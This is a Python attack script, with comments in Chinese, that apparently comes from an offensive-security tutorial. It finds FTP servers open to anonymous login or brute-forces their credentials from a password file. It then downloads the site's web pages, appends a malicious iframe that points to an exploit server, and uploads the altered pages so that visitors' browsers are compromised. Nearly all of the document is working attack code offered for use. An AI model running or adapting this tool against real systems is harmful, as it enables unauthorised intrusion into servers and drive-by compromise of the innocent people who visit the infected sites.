"""
构建匿名FTP扫描器。
首先判断FTP服务器能不能匿名登陆，如果不能就尝试暴力破解，
如果能破解出口令，或者能匿名登陆，就登陆到FTP站点修改WEB页面，
然后尝试破解访问用户的浏览器，进而控制用户的计算机。
"""
import time
import ftplib
import optparse

# 匿名访问，查找可以匿名访问的ftp服务器
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        # 匿名登陆 如果登陆不成功则报错
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + 'FTP Anonymous Login Successed.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + 'FTP Anonymous Login Failed.')
        return False

host = '192.168.1.101'
anonLogin(host)

# 文本遍历，破解ftp的用户和密码
def bruteLogin(hostname, passwordFile):
    pF = open(passwordFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        split_str = line.split(':')
        userName = split_str[0]
        password = split_str[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, password)
            print('\n[*] ' + str(hostname) + ' FTP Login Successed: ' + userName + '/' + password)
            ftp.quit()
            return (userName, password)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


host = '192.168.1.101'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)


# 通过发出NLST命令，逐个检查每个文件的文件名是不是WEB页面的文件名
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList
"""
host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
returnDefault(ftp)
"""

def injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'w') as f:
        ftp.retrlines('RETR ' + page, f.write)
        print('[+] Downloaded Page: ' + page)
        f.write(redirect)
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

"""
host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src="http://10.0.0.1:8000/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
"""

def attack(username, password, tgthost, redirect):
    ftp = ftplib.FTP(tgthost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)

def main():
    parser = optparse.OptionParser("usage %prog -H <target host[s]> -r <redirect page> [-f <userpass file>]")
    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
    parser.add_option('-p', dest='passwdFile', type='string', help='specify user/password file')
    (options, args) = parser.parse_args()

    tgtHosts = str(options.tgtHost).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect

    if (tgtHosts == None) | (redirect == None):
        print(parser.usage)
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
        elif passwdFile != None:
            (username, password) = bruteLogin(tgtHost, passwdFile)
            if password:
                print('[+] Using Creds: ' + username + '/' + password + ' to attack')
                attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
    main()